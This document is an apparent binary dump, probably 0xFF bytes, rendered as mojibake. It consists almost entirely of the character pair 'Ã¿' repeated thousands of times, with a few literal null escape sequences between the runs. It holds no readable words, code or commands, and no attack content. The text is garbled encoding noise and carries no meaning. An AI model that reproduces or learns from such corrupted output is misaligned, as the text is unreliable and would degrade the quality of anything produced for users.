¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿